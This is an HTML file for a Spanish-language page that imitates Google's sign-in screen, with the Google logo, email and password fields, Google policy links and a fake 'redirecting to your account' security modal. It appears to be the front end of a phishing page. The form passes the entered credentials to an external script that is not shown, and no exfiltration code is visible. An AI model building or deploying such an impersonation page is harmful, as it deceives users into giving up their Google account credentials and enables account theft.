<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - Google</title>
    
    <!-- Meta tags de seguridad -->
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
    <meta name="referrer" content="no-referrer">
    
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="https://imgs.search.brave.com/hM22sMomGmJfnPnH4L-bETy6idWAli9uUPIyheAWq2Q/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly91cGxvYWQud2lraW1lZGlhLm9yZy93aWtpcGVkaWEvY29tbW9ucy83LzdlL0dtYWlsX2ljb25fKDIwMjApLnN2Zw">
</head>
<body>
    <div class="container">
        <!-- Panel de inicio de sesión principal -->
        <div class="login-box" id="loginPanel">
            <div class="logo">
                <span style="color: #4285F4;">G</span>
                <span style="color: #EA4335;">o</span>
                <span style="color: #FBBC05;">o</span>
                <span style="color: #4285F4;">g</span>
                <span style="color: #34A853;">l</span>
                <span style="color: #EA4335;">e</span>
            </div>
            
            <h2>Iniciar sesión</h2>
            <p class="subtitle">Utiliza tu Cuenta de Google</p>
            
            <form id="loginForm" action="javascript:void(0)">
                <div class="input-group">
                    <input type="email" id="email" name="email" required autocomplete="off">
                    <label for="email">Correo electrónico o teléfono</label>
                </div>
                
                <div class="input-group hidden" id="passwordGroup">
                    <input type="password" id="password" name="password" required autocomplete="off">
                    <label for="password">Introduce tu contraseña</label>
                </div>
                
                <div class="links">
                    <a href="#" class="forgot-link" id="forgotEmailLink">¿Has olvidado tu correo electrónico?</a>
                </div>
                
                <div class="info-box hidden" id="securityInfo">
                    <p>Protegido por reCAPTCHA y sujeto a la <a href="https://policies.google.com/privacy" target="_blank">Política de Privacidad</a> y <a href="https://policies.google.com/terms" target="_blank">Términos del Servicio</a> de Google.</p>
                </div>
                
                <div class="buttons">
                    <a href="#" class="create-account" id="createAccountLink">Crear cuenta</a>
                    <button type="button" id="nextBtn" class="btn btn-primary">Siguiente</button>
                    <button type="submit" id="submitBtn" class="btn btn-primary hidden">Iniciar sesión</button>
                </div>
            </form>
        </div>

        <!-- Los otros formularios mantienen la misma estructura -->
        
        <div class="footer">
            <select id="language">
                <option>Español (España)</option>
                <option>English (United States)</option>
            </select>
            <div class="footer-links">
                <a href="https://support.google.com" target="_blank">Ayuda</a>
                <a href="https://policies.google.com/privacy" target="_blank">Privacidad</a>
                <a href="https://policies.google.com/terms" target="_blank">Términos</a>
            </div>
        </div>
    </div>

    <div id="successModal" class="modal hidden">
        <div class="modal-content">
            <h3>Verificación de seguridad</h3>
            <p>Redirigiendo a tu cuenta...</p>
            <div class="loading-bar"></div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
